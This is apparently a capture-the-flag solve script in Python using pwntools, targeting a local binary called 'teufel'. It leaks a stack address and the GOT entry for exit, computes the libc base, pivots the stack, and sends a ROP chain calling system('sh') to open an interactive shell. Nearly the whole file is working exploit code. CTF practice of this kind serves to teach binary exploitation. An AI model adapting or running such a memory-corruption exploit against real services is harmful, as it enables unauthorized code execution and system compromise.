#!/usr/bin/env python

from pwn import *

# STAGE 1
# 1) We leak the address of the stack
# 2) After we leak the exit() got, the binary is terminated
# 3) We calculate the libc_base_address
# 4) We save the distance between stack address to the libc_base (stack_to_libc_base)
# 5) This distance is always constant

# STAGE 2
# 1) We leak the address of the stack
# 2) Using stack_to_libc_base, we compute the libc base address again
# 3) Finally we can call system()

# There is no remote version, because the challenge is already down

# To debug:
# $ socat -v tcp-l:3000,reuseaddr,fork exec:"./teufel"
# $ gdb ./teufel --pid=$(pgrep teufel)

### STAGE 1 ### 
x = remote('127.0.0.1', 3000)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
print util.proc.pidof(x)

function_start = 0x4004e6
mov_pop_ret    = 0x400532
pop_rdi_ret    = 0x01fc3a # the only hardcoded offset
"""
gdb-peda$ x /3i 0x0400532
   0x400532:    mov    rsp,rbp
   0x400535:    pop    rbp
   0x400536:    ret
"""

# Send sizeof(msg) + msg as the service expects
def wrap_msg(buf):
  print "Sending {0} bytes".format(len(buf))
  r = ""
  r += p64(len(buf))
  r += buf
  return r

def leak_stack_address():
  # Overwrite \x00 to leak stack address
  x.send(wrap_msg("A" * 0x09))
  x.recv(8)

  # Leak the stack address
  addr = u64(x.recv(6) + "\x00\x00") - 0x41
  print 'Stack address leak: ' + hex(addr)
  return addr

def leak_got_address():
  payload = ""
  payload += p64(0x0)*1        # padding
  payload += p64(0x600fd0+0x8) # readelf --relocs teufel | grep exit
  payload += p64(0x40051f)     # 0x40051f:    lea    rdi,[rbp-0x8]
  x.send(wrap_msg(payload))
  x.recvline()
  x.recvline()
  addr = u64(x.recv(0x6).ljust(8, "\x00"))
  print "GOT exit leak: " + hex(addr)
  return addr

def prepare_stack():
  # Set esp as `stack_leak - 0x20 - i`, then jump to the function start again
  for i in range(0, 64, 8):
    x.send(wrap_msg(p64(function_start) + p64(stack_leak - 0x20 - i)  + p64(mov_pop_ret)))
    x.recvline()

# Leak the stack address and shift it
stack_leak = leak_stack_address()
prepare_stack()

# Leak the GOT exit address
got_exit_leak = leak_got_address()

# Calculate the offset in libc
libc_base = got_exit_leak - libc.symbols['_exit']
print "Libc offset - stack: " + hex(stack_leak - libc_base)
stack_to_libc_base = stack_leak - libc_base
x.close()

### STAGE 2 ### 
x = remote('127.0.0.1', 3000)
stack_leak = leak_stack_address()
prepare_stack()
pause()

libc.address = stack_leak - stack_to_libc_base

# Deliver the execve() payload
shell_address = next(libc.search('sh\x00'))
system_address = libc.symbols['system']

payload  = p64(0) * 2 # padding
payload += p64(libc.address + pop_rdi_ret)
payload += p64(shell_address)
payload += p64(system_address)

x.send(wrap_msg(payload))
pause()

x.interactive()